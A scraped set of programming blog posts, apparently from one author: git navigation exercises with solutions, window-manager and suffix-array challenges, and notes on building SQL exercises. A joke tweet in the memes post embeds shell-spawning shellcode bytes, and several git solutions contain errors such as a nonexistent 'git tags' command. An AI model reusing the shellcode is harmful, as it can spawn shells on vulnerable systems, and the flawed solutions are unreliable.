“I\nlearned something” button, and I noticed something weird – a lot of people\nwere tweeting things like “I got  8 ⁄ 10 ”, “I got  10 ⁄ 10 ”. \n\n I was a bit worried about this because the whole idea was to help people\nidentify things they could learn, so saying “I got  8 ⁄ 10 ” felt like it was\nfocusing on the things you already knew and ignoring the most important thing\n– the 2 questions where maybe you could learn something new! \n\n So I added an “I learned something!” button back to each question and spent way\ntoo much time building a fun SVG+CSS animation that played when you pressed the\nbutton. And so far it seems to have worked – I see more people commenting “I\nlearned something” and less “I got  9 ⁄ 10 ”. \n\n building small things is hard \n\n As usual, building small simple things takes more time than I’d expect! The\nconcept of “some questions and answers” seems really simple, but I’ve already\nlearned a lot by building this and I think I still have a lot more to learn\nabout this format. \n\n But I’m excited to learn more, and I’d love to know your thoughts. Here it is\nagain if you’d like to try it:  https://questions.wizardzines.com . \n\n"},
{"url": "https://jvns.ca/blog/2019/08/30/git-exercises--navigate-a-repository/", "title": "git exercises: navigate a repository", "content": "\n     \n\n \n.wrap-collabsible {\n  margin-bottom: 1.2rem 0;\n}\n\ninput[type='checkbox'] {\n  display: none;\n}\n\n.lbl-toggle {\n  display: block;\n\n  font-weight: bold;\n  font-family: monospace;\n  font-size: 1.2rem;\n  text-transform: uppercase;\n  text-align: center;\n\n  padding: 1rem;\n\n  color: white;\n  background: #ff7e3e;\n\n  cursor: pointer;\n\n  border-radius: 7px;\n  transition: all 0.25s ease-out;\n}\n\n.lbl-toggle:hover {\n  color: #ffeeee;\n}\n\n.lbl-toggle::before {\n  content: ' ';\n  display: inline-block;\n\n  border-top: 5px solid transparent;\n  border-bottom: 5px solid transparent;\n  border-left: 5px solid currentColor;\n  vertical-align: middle;\n  margin-right: .7rem;\n  transform: translateY(-2px);\n\n  transition: transform .2s ease-out;\n}\n\n.toggle:checked + .lbl-toggle::before {\n  transform: rotate(90deg) translateX(-3px);\n}\n\n.collapsible-content {\n  max-height: 0px;\n  overflow: hidden;\n  transition: max-height .25s ease-in-out;\n}\n\n.toggle:checked + .lbl-toggle + .collapsible-content {\n  max-height: 30050px;\n}\n\n.toggle:checked + .lbl-toggle {\n  border-bottom-right-radius: 0;\n  border-bottom-left-radius: 0;\n}\n\n.collapsible-content .content-inner {\n  background: #fff1da; /*rgba(250, 224, 66, .2); */\n  border-bottom: 1px solid rgba(250, 224, 66, .45);\n  border-bottom-left-radius: 7px;\n  border-bottom-right-radius: 7px;\n  padding: .5rem 1rem;\n}\n \n\n I think the  curl exercises  the other day went\nwell, so today I woke up and wanted to try writing some Git exercises. Git is a big thing to learn,\nprobably too big to learn in a few hours, so my first idea for how to break it down was by starting\nby  navigating  a repository. \n\n I was originally going to use a toy test repository, but then I thought – why not a real\nrepository? That’s way more fun! So we’re going to navigate the repository for the Ruby programming\nlanguage. You don’t need to know any C to do this exercise, it’s just about getting comfortable with\nlooking at how files in a repository change over time. \n\n clone the repository \n\n To get started, clone the repository: \n\n git clone https://github.com/ruby/ruby\n \n\n The big different thing about this repository (as compared to most of the repositories you’ll work\nwith in real life) is that it doesn’t have branches, but it DOES have lots of tags, which are\nsimilar to branches in that they’re both just pointers to a commit. So we’ll do exercises with tags\ninstead of branches. The way you  change  tags and branches are very different, but the way you\n look at  tags and branches is exactly the same. \n\n a git SHA always refers to the same code \n\n The most important thing to keep in mind while doing these exercises is that a git SHA like\n 9e3d9a2a009d2a0281802a84e1c5cc1c887edc71  always refers to the same code, as explained in this\npage. This page is from a zine I wrote with Katie Sylor-Miller called  Oh shit, git! . (She also has a great site called\n https://ohshitgit.com/  that inspired the zine). \n\n \n \n \n\n We’ll be using git SHAs really heavily in the exercises to get you used to working with them and\nto help understand how they correspond to tags and branches. \n\n git subcommands we’ll be using \n\n All of these exercises only use 5 git subcommands: \n\n git checkout\ngit log (--oneline, --author, and -S will be useful)\ngit diff (--stat will be useful)\ngit show\ngit status\n \n\n exercises \n\n \n Check out matz’s commit of Ruby from 1998. The commit ID is  3db12e8b236ac8f88db8eb4690d10e4a3b8dbcd4 . Find out how many lines of code Ruby was at that time. \n Check out the current master branch \n Look at the history for the file  hash.c . What was the last commit ID that changed that file? \n Get a diff of how  hash.c  has changed in the last 20ish years: compare that file on the master\nbranch to the file at commit  3db12e8b236ac8f88db8eb4690d10e4a3b8dbcd4 . \n Find a recent commit that changed  hash.c  and look at the diff for that commit \n This repository has a bunch of  tags  for every Ruby release. Get a list of all the tags. \n Find out how many files changed between tag  v1_8_6_187  and tag  v1_8_6_188 \n Find a commit (any commit) from 2015 and check it out, look at the files very briefly, then go back to the master branch. \n Find out what commit the tag  v1_8_6_187  corresponds to. \n List the directory  .git/refs/tags . Run  cat .git/refs/tags/v1_8_6_187  to see the contents\nof one of those files. \n Find out what commit ID  HEAD  corresponds to right now. \n Find out how many commits have been made to the  test/  directory \n Get a diff of  lib/telnet.rb  between the commits  65a5162550f58047974793cdc8067a970b2435c0  and\n 9e3d9a2a009d2a0281802a84e1c5cc1c887edc71 . How many lines of that file were changed? \n How many commits were made between Ruby 2.5.1 and 2.5.2 (tags  v2_5_1  and  v2_5_3 ) \n How many commits were authored by  matz  (Ruby’s creator)? \n What’s the most recent commit that included the word  tkutil ? \n Check out the commit  e51dca2596db9567bd4d698b18b4d300575d3881  and create a new branch that\npoints at that commit. \n Run  git reflog  to see all the navigating of the repository you’ve done so far \n \n\n \n \n Solutions \n \n \n \n \n Question #1:  Check out matz's commit of Ruby from 1998. The commit ID is `3db12e8b236ac8f88db8eb4690d10e4a3b8dbcd4`. Find out how many lines of code Ruby was at that time.\n \n Solution #1:  \n \ngit checkout 3db12e8b236ac8f88db8eb4690d10e4a3b8dbcd4\nfind . -name '*.c' | xargs wc -l\n \n\n \n Question #2:  Check out the current master branch\n \n Solution #2: \n \ngit checkout master\n \n\n\n \n Question #3:  Look at the history for the file `hash.c`. What was the last commit ID that changed that file?\n\n Solution #3: \n \ngit log hash.c\n# look at the first line to get the commit ID. \n# I got 3df37259d81d9fc71f8b4f0b8d45dc9d0af81ab4.\n \n\n\n\n \n Question #4:  Get a diff of how `hash.c` has changed in the last 20ish years: compare that file on the master branch to the file at commit `3db12e8b236ac8f88db8eb4690d10e4a3b8dbcd4`.\n Solution #4: \n \ngit diff 3db12e8b236ac8f88db8eb4690d10e4a3b8dbcd4 hash.c\n \n\n\n \n Question #5:  Find a recent commit that changed `hash.c` and look at the diff for that commit\n Solution #5: \n \ngit log hash.c\n# look at the first line to get the commit ID. \n# I got 3df37259d81d9fc71f8b4f0b8d45dc9d0af81ab4.\ngit show 3df37259d81d9fc71f8b4f0b8d45dc9d0af81ab4\n \n\n \n Question #6:  This repository has a bunch of **tags** for every Ruby release. Get a list of all the tags.\n Solution #6: \n \ngit tags\n \n\n \n Question #7:  Find out how many files changed between tag `v1_8_6_187` and tag `v1_8_6_188`\n Solution #7: \n \ngit diff v1_8_6_187 v1_8_6_188 --stat\n# 5 files!\n \n\n \n Question #8:  Find a commit (any commit) from 2015 and check it out, look at the files very briefly, then go back to the master branch.\n Solution #8: \n \ngit log | grep -C 2 ' 2015 ' | head\ngit checkout bd5d443a56ee4bcb59a0a08776c07dea3ee60121\nls\ngit checkout master\n \n\n \n Question #9:  Find out what commit the tag `v1_8_6_187` corresponds to.\n Solution #9: \n \ngit show v1_8_6_187\n \n\n \n Question #10:  List the directory `.git/refs/tags`. Run `cat .git/refs/tags/v1_8_6_187` to see the contents of one of those files.\n Solution #10: \n \n$ cat .git/refs/tags/v1_8_6_187\n928e6916b25aee5b2b379999a3fa8816d40db714\n \n\n \n Question #11:  Find out what commit ID `HEAD` corresponds to right now.\n Solution #11: \n \ngit show HEAD\n \n\n \n Question #12:  Find out how many commits have been made to the `test/` directory\n Solution #12: \n \ngit log --oneline test/ | wc\n \n\n \n Question #13:  Get a diff of `lib/telnet.rb` between the commits `f2a91397fd7f9ca5bb3d296ec6df2de6f9cfc7cb` and `e44c9b11475d0be2f63286c1332a48da1b4d8626 `. How many lines of that file were changed?\n Solution #13: \n \ngit diff f2a91397fd7f9..e44c9b11475d0 lib/tempfile.rb\n \n\n \n Question #14:  How many commits were made between Ruby 2.5.1 and 2.5.2 (tags `v2_5_1` and `v2_5_3`) \n Solution #14: \n \ngit log v2_5_1..v2_5_3 --oneline | wc\n \n\n \n Question #15:  How many commits were authored by `matz` (Ruby's creator)?\n Solution #15: \n \ngit log --oneline --author matz | wc -l\n \n\n \n Question #16:  What's the most recent commit that included the word `tkutil`?\n Solution #16: \n \ngit log -S tkutil\n# result is 6c5f5233db596c2c7708d5807d9a925a3a0ee73a\n \n\n \n Question #17:  Check out the commit `e51dca2596db9567bd4d698b18b4d300575d3881` and create a new branch that points at that commit. \n Solution #17: \n \ngit checkout e51dca2596db9567bd4d698b18b4d300575d3881\ngit branch my-branch\n \n\n \n Question #18:  Run `git reflog` to see all the navigating of the repository you've done so far\n Solution #18: \n \ngit reflog\n \n\n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2016/09/07/new-zine-linux-debugging-tools-youll-love/", "title": "New zine: Linux debugging tools you'll love", "content": "\n      HELLO FRIENDS. I am announcing this everywhere because I’m very excited about\nit. I released a new zine today!  Read it here ! Read all my zine things at  wizardzines.com ! \n\n This zine is about some of my favorite Linux debugging tools, especially tools that I don’t think are as well-known as they should be. It covers  strace ,  opensnoop / eBPF , and  dstat !  netcat ,  netstat ,  tcpdump ,  wireshark , and  ngrep ! And there’s a whole section on  perf  because perf is the best. \n\n If you don’t know what any of those tools I just mentioned are – PERFECT. You\nare who this zine is for!!! Read it and find out why I love them! Also, a lot\nof these tools happen to work on OS X :) \n\n I’ve been really delighted to see that a ton of people have enjoyed & learned\nsomething new from this zine, whether they just started using Linux (!!!) or\nhave been debugging on Linux for 10 years. \n\n \n \n \n\n As usual, there are 3 versions. If you print it, you can print as many as you\nwant! Give them to your friends! Teach them about tcpdump! \n\n \n version to read on your  computer \n print version:  letter \n print version:  A4 \n \n\n The cover art is by  Monica , who is the best. \n\n Thanks to my amazing partner Kamal Marhubi for endless reviews, and many many other people. It turns out that a zine project takes a long time! I do not even know how people write books. \n\n"},
{"url": "https://jvns.ca/blog/2019/12/03/solutions-to-the-tiny-window-manager-challenge/", "title": "Solutions to the tiny window manager challenge", "content": "\n     \n\n Hello! Last week I posted a small  programming challenge to write a tiny window manager that bounces windows around the screen . \n\n \n\n I’ll write a bit about my experience of solving the challenge, or you can just\nskip to the end to see the solutions. \n\n what’s a window manager? \n\n An X window manager is a program that sends messages to the X server (which is\nin charge of drawing your windows) to tell it which windows to display and\nwhere. \n\n I found out that you can trace those events with  xtrace . Here’s some example\noutput from xtrace (for the toy window manager which is just moving windows\nabout) \n\n 000:<:02d8: 20: Request(12): ConfigureWindow window=0x004158e5 values={x=560 y=8}\n000:<:02da: 20: Request(12): ConfigureWindow window=0x004158e5 values={x=554 y=12}\n000:<:02dc: 20: Request(12): ConfigureWindow window=0x004158e5 values={x=548 y=16}\n000:<:02de: 20: Request(12): ConfigureWindow window=0x004158e5 values={x=542 y=20}\n000:<:02e0: 20: Request(12): ConfigureWindow window=0x004158e5 values={x=536 y=24}\n000:<:02e2: 20: Request(12): ConfigureWindow window=0x004158e5 values={x=530 y=28}\n000:<:02e4: 20: Request(12): ConfigureWindow window=0x004158e5 values={x=524 y=32}\n \n\n you can run programs without a window manager \n\n You technically don’t  need  a window manager to run graphical programs – if\nyou want to start an xterm in a window-manager-less X session you can just run \n\n xterm -display :1\n \n\n and it’ll start the xterm. Here’s a screenshot of an X session with no window\nmanager open. I even have 2 windows open! (chrome and an xterm). It has some\nmajor usability problems, for example I don’t think you can resize or move or\nswitch between windows. Which is where the window manager comes in! \n\n \n \n \n\n move a window with XMoveWindow \n\n The challenge was to make the window bounce around the screen. \n\n In the  tinywm source  they use  XMoveResizeWindow  to move and resize windows,\nbut I found in the  docs  that there’s\nalso a function called  XMoveWindow . Perfect! \n\n Here’s what it looks like. What could be simpler, right? And it works just the way I’d expect! \n\n XMoveWindow(display, windowID, x, y)\n \n\n Except… \n\n problem: multiple  XMoveWindow s don’t work \n\n I ran into a problem (which I got stuck on for a couple of hours) where when I\nran XMoveWindow twice, it would only apply the last move. \n\n XMoveWindow(display, windowID, 100, 200)\nusleep(2000 * 1000); # sleep for 2 seconds\nXMoveWindow(display, windowID, 300, 400)\n \n\n I’d expect this to move the window once, wait 2 seconds, and them move it\nagain. But that was not what happened! Instead, it would pause for 2 seconds\nand then move the window once (to the second location). \n\n use xtrace to trace window manager events \n\n I used xtrace to trace the events and found out that my  ConfigureWindow \nevents that  XMoveWindow  was sending were all being sent at the same time. So\nit seemed like X was batching the events. But why? \n\n XSync forces X to process events \n\n I didn’t know why this was happening, but I emailed Julian about it and he\npointed me in the direction of\n XSync , which forces\nX to process all the events you’ve sent it. Sure enough, I used XSync and\neverything worked beautifully. \n\n solutions \n\n I asked people to email me if they completed the challenge, and 4 people did!\nHere are their solutions. All the solutions I got implemented more features\nthan I did, so I’d encourage you to look at all the solutions if you’re\ninterested in how to solve this problem! \n\n \n Kacper Słomiński’s solution  (which uses  XQueryTree  to find the windows to bounce, which is nice) \n @whichxyj’s solution \n Alexsey Lagoshin’s stressfulwm , which allows bouncing multiple windows: \n Aldrin Martoq Ahumada’s bouncywm-ruby , which is the only solution in a language other than C I got! It uses an Xlib Ruby library that looks pretty straightforward to use. \n one really nice one with fancier bouncing effects which I’ll post here later if the person sends me the source \n my solution \n \n\n Here’s a gif of Alexsey’s solution. Apparently  XQuartz  on a Mac performs better than Xephyr! \n\n \n\n And Aldrin’s solution, with a great use of  xeyes : \n\n \n\n"},
{"url": "https://jvns.ca/blog/2019/09/30/notes-on-building-sql-exercises/", "title": "Notes on building SQL exercises", "content": "\n     \n\n In the last couple of weeks I’ve been working on some interactive SQL exercises\nto help people get better at writing SQL queries. This is a pretty new thing\nfor me so I thought I’d write a few notes about my process so far! \n\n why SQL is exciting: distributed SQL engines \n\n To me the reason why SQL is exciting is that a lot of companies are storing\ntheir data in distributed SQL databases (Google BigQuery, Amazon Redshift,\nSpark SQL, Presto, etc) that let you run a complicated query across a billion\nrows pretty quickly! They’re fast partly because they’re designed to run your\nquery across possibly tens or hundreds of computers. \n\n At my last job I wrote thousands of SQL queries to do data analysis while I was\nworking on the machine learning team, mostly ad hoc queries to answer questions\nI had about our data. I learned a lot of fun tricks to make them faster /\neasier to write and I’ve never really talked about it! \n\n So I think SQL is a really nice way to go from “I have this sort of complicated\nquestion about billions of rows of data” to “ok, that’s the answer, great, I\ncan move on”. \n\n why write exercises: knowledge != skills \n\n This is the first time I’m really trying in earnest to write exercises to teach\nsomething, instead of just explanations of the thing. The reason I’m doing this\nis that I read  Design for how people learn \nby Julie Dirksen and she makes the point that  knowledge  is different from\n skills . \n\n She defines a “skill” as “something you have to practice”. And SQL is\ndefinitely something that you have to practice if you want to learn it! So I\nthought – SQL is a relatively simple skill (as\nprogramming/programming-adjacent skills go!), maybe I can make something\ninteractive and relatively simple to help people improve their SQL skills! \n\n It’s also, well, a challenge, and I like trying things I haven’t tried before. \n\n how I’m doing it: start with a challenge \n\n I started out doing these SQL exercises in kind of the obvious way: start out\nwith easy exercises, and then make them harder and harder over time to\nintroduce new concepts. But when I watched people trying it out, I noticed a\nproblem – a lot of people already  know  some SQL, and sometimes they would go\nthrough all the exercises without learning anything at all! That’s no fun! \n\n So I came up with a different structure for each section of the SQL exercises: \n\n \n Start with a “challenge” that tests the skill the section is trying to teach. \n If the challenge is too hard, move on to a bunch of easier exercises that teach you the skills you need to solve the challenge. \n \n\n Since showing is easier than explaining:  here’s a draft of a page teaching\nGROUP BY . Here’s a screenshot of what the initial “challenge” for basic group by looks like: \n\n \n\n I think that challenge in particular isn’t very good yet (I have a lot of work to do!) but that’s the idea. \n\n how I’m getting feedback: anonymously track responses \n\n Early on I also realized that I needed to get feedback about which challenges people were finding hard / easy. Every time someone runs a query, I track \n\n \n a randomly generated UUID for the person doing the challenge (like  f139a44c-ef09-43d2-8d7d-cabba9c28aa1 ) \n the query they ran \n the puzzle they were solving \n \n\n I’ve already learned a lot from this, for example: \n\n \n at first I required that the column names match, but it resulted in a lot of people getting the “wrong” answer for no good reason, so I removed that requirement \n when I’m not clear about how the results should be ordered, often people end up with the right answer except in the “wrong” order. Still need to do something about that. \n if I don’t explain the syntax for  COUNT(DISTINCT col) , some people end up using the wrong syntax and getting stuck \n in the joins exercise, some people get stuck on join order. (they do  x LEFT join y  instead of  y LEFT JOIN x  and then don’t get the right answer) \n \n\n So basically (in addition to making more exercises) I think I need to spend more time cataloguing where/how people are getting stuck in practice and helping make sure fewer people get stuck. \n\n the tech stack \n\n To build this, I’m using: \n\n \n sql.js  to run the SQL queries in the browser with SQLite (there’s no server, it’s all done in the browser, so nobody can take down the server by running really expensive queries :) ) \n firestore  to store the queries people are trying out \n vue.js  to manage Javascript components \n typescript  to compensate a bit for my lack of Javascript experience and help me refactor my code more easily \n tailwind css  for CSS \n \n\n I also bought the  Refactoring UI  book to try to improve my web design skills a tiny bit. I think it’s helped a little so far. \n\n Vue components let me really easily add new challenges/exercises to a page like this: \n\n <Puzzle\n   id=\"count-the-owners\"\n   title='Count the number of different cat owners'\n   description=\"\n   You can use <code>COUNT(DISTINCT column)</code> to count distinct values of a column. (you can also do <code>SUM(DISTINCT column)</code> or <code>AVG(DISTINCT column)</code> but I'm not sure why that would be useful.\n   \"\n   answer= \"\n   SELECT count(distinct(owner)) AS num_owners\n   from cats\n   \"\n   v-bind:table_names='[\"cats\"]'\n   >\n</Puzzle>\n \n\n the goal: make something that’s worth $100 or so \n\n What I’m working towards is making exercises & challenges that would help\nsomeone with beginner/intermediate SQL skills improve their SQL fluency enough\nthat it’d easily be worth $100 to them. We’ll see if I can get there! I don’t\nknow whether I’ll price it at $100, but that’s my goal for how useful it should\nbe. \n\n The person I have in mind is sort of (as usual) myself 6 years ago, when I’d\n heard  of SQL and could write a basic query but if you gave me a table of VERY\nINTERESTING DATA I couldn’t really effectively use SQL to answer the questions\nI had about it. \n\n"},
{"url": "https://jvns.ca/blog/twitter-memes-challenge/", "title": "Challenge: find Twitter memes with suffix arrays", "content": "\n     \n\n This challenge is a mix of data analysis and using fun algorithms! It’s the second challenge in a a short series of programming challenge I’m writing with Julian. (the  first one was to write a tiny fun window manager ) \n\n Twitter has a lot of memes. For example, if you search Twitter for  Flight attendant: is there a doctor on this flight? ,\nyou’ll find a bunch of tweets making jokes like this: \n\n Flight Attendant: is there a doctor on board?\nParent: *nudging* That should've been you\nMe: Not now, this is serious\nParent: Not asking for a hacker to help, are they?\nMe: AAAAAAAA\\x00\\xd0X?\\xfc\\x7fBBBBj\\x0bX\\x99Rfh-p\\x89\\xe1Rjhh/bash/bin\\x89\\xe3RQS\\x89\\xe1\\xcd\\x80\nParent:~#\n \n\n or if you search  as a kpop fan  there are thousands of these: \n\n me as a kpop fan \n\n- kpop fan age: 10 years\n- first group ever stan: super junior\n- current ult groups: iKON, X1, Day6\n- number of albums: >20 \n- concerts attended: 6\n- lightsticks owned: 2\n \n\n So! Suppose you have a million tweets from the last 2 days. How do you find\nthe jokes / quizzes / memes people are playing with on Twitter? \n\n Challenge: find the twitter memes in 1 million tweets \n\n This is a pretty open ended challenge and you can do it any way you want.\nHere’s a  SQLite database with 1.2 million tweets , collected\nfrom the  twitter streaming api  over 2 days.\nIt’s 250MB (70MB compressed), it only has English tweets. It excludes retweets and many tweets that are generated by bots. \n\n The challenge: find at least 5 Twitter memes using that dataset. \n\n memes as common substrings \n\n The idea here is that memes are substrings like “me as a kpop fan” that many\ndifferent people are using. The tricky thing is that you don’t really know how\nlong those substrings will be, and maybe you’re interested in phrases of\ndifferent lengths. \n\n You can probably do this challenge without using anything fancy (with a hashmap\nof phrases or something) but I think it’s a nice opportunity to play with a fun\ndata structure: suffix arrays! So let’s talk about what those are. \n\n suffix arrays: sort all suffixes \n\n Suffix arrays sort all suffixes of a string. For example, here’s the suffix array for “plantain” which has the suffixes plantain, lantain, antain, ntain, tain, ain, in, n. \n\n ain\nantain\nin\nlantain\nn\nntain\nplantain\ntain\n \n\n Representing this as a list of strings would be very inefficient (quadratic space), so instead we\nreplace each suffix with the index of its first character in the original\nstring –  [5,2,6,1,7,3,0,4] . \n\n 5 (ain)\n2 (antain)\n6 (in)\n1 (lantain)\n7 (n)\n3 (ntain)\n0 (plantain)\n4 (tain)\n \n\n Here’s a real example of what a suffix array of 1 million tweets concatenated\nlooks like. This is an excerpt from the middle of the suffix array, with\nsome of the suffixes that start with  A little . \n\n ...\n A little distracted for a bit ...what do i do w my life hon.........\n A little exercise I did this afternoon.  #comics #art #clip.........\n A little extra Christmas Cash on me! Good Luck to everyone!.........\n A little girl in Savannah, Ga., appears to be the 38th huma.........\n A little heavy on the smut t… https://t.co/nvoxE7SNjTI wa.........\n A little in state battle tonight. #nova vs #penn. two very .........\n A little kiss...” one more time I’m going to vomit. #TT.........\n A little late catching up on last nights @GoodDoctorABC. On.........\n A little less bling never hurt anyone! Next project...🎄 .........\n A little more intensity to augment their talent and a coupl.........\n A little more time, because I have never lived really  - Os.........\n A little mor… https://t.co/kcq3zf9jgeWe love MX ❤️<F0><9F><A7>.........\n A little over 50k! Can We Guess How Much Is In Your Account.........\n A little ray of joy &amp; light in the midst of these very .........\n A little refreshment… https://t.co/HgX8PmYwPIThank you @L.........\n A little respect goes a long way. .........\n A little salt in d country's troubled legal system“Grant................\n A little snow &amp; people lose all common senseromantic st...............\n A little sun for the soul @realfreewebcams https://t.co/3CB...............\n A little sunkissed moment for y’all. ...............\n ....\n \n\n Again, this is actually represented by a bunch of integer indexes into a\nconcatenated string of all the tweets, like  [18238223, 1921812, ...]  so it’s a\nLOT more memory efficient than actually repeating all those strings. \n\n suffix arrays let you find common substrings! \n\n So what does this have to do with Twitter memes? Well, we can basically \n\n \n concatenate all tweets into a big string \n make a suffix array of that string \n iterate through the suffix array and notice when you see a lot of repeated substrings, like here: \n \n\n me as a kpop fan ✨kpop fan age: 15 y/o ✨first group ever stan: blackpink ✨current ult groups: btxt ✨number of albu… https://t.co/24diHX9sLm\nme as a kpop fan ⭐k-pop fan age: 12 y/o ⭐first group ever stan: bts ⭐current ult gps: bts and txt ⭐number of albu… https://t.co/8R95roQXoE\nme as a kpop fan ⭐k-pop fan age: 14 y/o ⭐first group ever stan: girls generation ⭐current ult gp: txt ⭐number of a… https://t.co/010hLuJscF\nme as a kpop fan ⭐k-pop fan age: 14-16 y/o ⭐first group ever stan: bts ⭐current ult gps: bts txt ⭐number of albums… https://t.co/0fDcxZGRrh\nme as a kpop fan ⭐k-pop fan age: 15 y/o ⭐first group ever stan: blackpink ⭐current ult gps: txt ⭐number of albums… https://t.co/d8zZL83TvV\nme as a kpop fan 🌸 k-pop fan age: 12 years old 🌸 first group ever stan: bts 🌸 current ult gps: bts &amp; wanna one 🌸 n… https://t.co/22R1nJpwNX\nme as a kpop fan 🌸k-pop fan age: 10 🌸first group ever stan: 2pm 🌸current ult gps: skz,got7,itzy,twice, 🌸number of… https://t.co/mAluaP2yxH\nme as a kpop fan 🌸k-pop fan age: 11 yo 🌸first group ever stan: beast 🌸current ult gps: ateez 🌸number of albums:  1… https://t.co/qxtFHG9HDg\nme as a kpop fan 🌸k-pop fan age: 11 🌸first group ever stan: bts 🌸current ult gps: bts and ateez 🌸number of albums:… https://t.co/mKXlkrBBtC\nme as a kpop fan 🌸k-pop fan age: 13 (now im 19) 🌸first group ever stan: snsd 🌸current ult gps: nct day6 aoa mamam… https://t.co/8XyQ3r5hwz\nme as a kpop fan 🌸k-pop fan age: 13 years 🌸first group ever stan: 2pm,suju,bigbang 🌸current ult gps: bts,tbz,ateez… https://t.co/Zs1nQQz6Lt\nme as a kpop fan 🌸k-pop fan age: 14 (2005) 🌸first group ever stan: super junior 🌸current ult gps: exo, gfriend, rv… https://t.co/vgmhe2vFMY\nme as a kpop fan 🌸k-pop fan age: 14 y/o 🌸first group ever stan: nct dream 🌸current ult gps: svt and,,*insert stan… https://t.co/I38Ui69PvL\nme as a kpop fan 🌸k-pop fan age: 15 y/o 🌸first group ever stan: 5sos 🌸current ult gps: bts and 5sos also some ggs… https://t.co/61ZmRkzmdl\nme as a kpop fan 🌸k-pop fan age: 15 y/o 🌸first group ever stan: bts 🌸current ult gps: SVT, GOT7, Day6 🌸number of… https://t.co/16SWb3mSPg\nme as a kpop fan 🌸k-pop fan age: 18 🌸first group ever stan: suju &amp; soshi 🌸current ult gps: snsd &amp; izone 🌸number of… https://t.co/SmSBFqJnGk\nme as a kpop fan 🌸k-pop fan age: 19 y/o marupok 🌸first group ever stan: APINK 🌸current ult gps: SEVENTEEN 🌸number… https://t.co/StYjxr6uq9\nme as a kpop fan 🌸k-pop fan age: 19 🌸first group ever stan: SuJu 🌸current ult gps: SuJu, SF9, SKZ, VIXX, ONEUS, NO… https://t.co/2o2DulCY5b\n \n\n suffix arrays also enable really fast search \n\n As an aside, the reason I got interested in suffix arrays in the first place\nwas actually not for finding Twitter memes at all but for search. \n\n I’ve spent a lot of time using Nelson Elhage’s  livegrep  at work to search\ncode. It creates a suffix array using the divsufsort library. He has a blog post\n Regular Expression Search with Suffix Arrays \nwhere he talks about some of the implementation details. \n\n The reason suffix arrays work for fast search is basically that if you’re\nlooking for the string  A little , you can do a binary search over the suffix array to\nfind every instance of  A little  in your dataset.  Binary searches are\nextremely fast so every search is guaranteed to run very quickly (in less than\na microsecond I believe). What livegrep does is more complicated than that\nbecause it does a regular expression search, but that’s the idea to start. \n\n There’s another blog post  How to use suffix arrays to combat common limitations of full-text search  applying suffix arrays to searching through a patent database. In that example, like with code search, the patent officers want to search patents for exact strings. \n\n How do you make a suffix array? \n\n You can use an existing suffix array library, for example  index/suffixarray in\nGo , which is what I used, or\n divsufsort . There are  Python\nbindings for divsufsort . \n\n If you’re more excited about the data structures/algorithms aspect of suffix\narrays you can also implement a suffix array-building algorithm yourself! I did\nnot do this but you can see an implementation of  qsufsort here in Go .\nThat implementation links to a paper. There are lots of algorithms for constructing suffix arrays – sais  and\n divsufsort  are a couple of others. \n\n 5 or so hours, 100 lines of Go \n\n As always with these challenges, I did this one to make sure that it’s both\ndoable in a reasonable amount of time and fun for at least one person (me). \n\n I did this one in about 5 hours and 100 lines of Go using the suffixarray\nimplementation in the Go standard library, with a bit of bash shell scripting\nto postprocess the results. This is a messy data analysis challenge – as an\nexample of a messy thing, Spotify released their end-of-2019 results while I\nwas building the dataset and so there are a lot of tweets generated by the\nSpotify app. \n\n My results ended up looking something like this: \n\n 5  an Aries and that’s why I gotta \n5  an Aries and that’s why I am so \n5  an Aquarius and that’s why I \n5  AM SO PROUD OF YOU \n5  am not a fan of \n5  am I the only one who \n5  am going to have to \n \n\n Then I sifted through them pretty manually to find the Twitter memes. \n\n suffix arrays are used in bioinformatics \n\n This “find twitter memes using suffix arrays” approach is a silly thing but it\ndoes have some relationship to reality – DNA sequences are basically really\nlong strings, and biologists need to find patterns in them, and they sometimes\nuse suffix arrays to do it. \n\n I looked up  packages in Debian that use libdivsufsort  and I found  infernal : \n\n \n Infernal (“INFERence of RNA ALignment”) is for searching DNA sequence\n databases for RNA structure and sequence similarities. It is an\n implementation of a special case of profile stochastic context-free grammars\n called covariance models (CMs). A CM is like a sequence profile, but it\n scores a combination of sequence consensus and RNA secondary structure\n consensus, so in many cases, it is more capable of identifying RNA homologs\n that conserve their secondary structure more than their primary sequence. \n \n\n that’s all! \n\n Thanks to Julian for discussing suffix arrays and suffix trees and trigram indexes with me at length, and to Kamal who had the idea of using suffix arrays to find Twitter memes. \n\n"},
{"url": "https://jvns.ca/blog/2019/11/20/what-makes-a-programming-exercise-good/", "title": "What makes a programming exercise good?", "content": "\n     \n\n I’ve been thinking about programming exercises lately, because I want to move\ninto teaching people skills. But what makes a good programming exercise? I\n asked about this on Twitter today  and got some useful\nresponses so here are some criteria: \n\n it’s fun \n\n This one is sort of self-explanatory and I think it’s really important.\nProgramming is fun and learning is fun so I can’t see why programming exercises\nwould need to be boring. \n\n it teaches you something you care about \n\n I don’t think this has to strictly mean “relevant to your job right this\nsecond” – people don’t just have jobs, we also want to make art and games and\nfun personal projects and sometimes just understand the world around us. But\nit’s important to know what goals the exercise can help you with and what it’s related to! \n\n Some arbitrary examples: \n\n \n take an image of something from a website and reproduce it from scratch with\nCSS (towards using CSS to make your own websites that look awesome) \n write a webserver from scratch without any frameworks (to learn the HTTP protocol,\nso that you can debug issues with a real webserver more easily) \n write a small raytracer (so you can make cool art with raytracing techniques on shaderhub!) \n write a tiny bit of assembly (as a very initial step towards understanding of\nwhat Spectre and Meltdown are even about and why we need to make all our\ncomputers run slower to prevent them) \n \n\n it’s a challenge \n\n I don’t know if this is everyone’s experience but I often start programming\nexercises and get bored quickly (“oh, I know how to do this, this is boring”).\nFor me it’s really important for the exercise to teach me something I really\ndon’t know how to do and that’s a little bit hard for me. \n\n My favourite set of programming exercises is the  cryptopals crypto\nchallenges  because they get harder pretty fast – by\nexercise #6, you’re already breaking toy encryption protocols, and by #12\nyou’re breaking an Actual Encryption Protocol (AES in ECB mode)! \n\n you can tell if you succeeded \n\n It’s easy to write exercises that are too vaguely specified (“write a toy tcp\nstack!“). But what does that mean? How much of a TCP stack am I supposed to\nwrite? Having test cases and clear criteria for “yay! you did it!\ncongratulations!” is really important. \n\n you can do it quickly \n\n In less than 2-3 hours (an evening after work), say. It’s hard to find time to\nspend like 8 hours on an exercise unless it’s REALLY exciting. \n\n I also think that giving some specific real-world benchmark data seems nice (“I\ndid this from scratch in 97 minutes”). \n\n the author believes in you \n\n This is a bit fuzzier but very lovely –  this person on Twitter wrote : \n\n \n Similar to that, the writing is patient and gives me the impression that it\nbelieves in my ability to accomplish the task. … I learned a ton in the 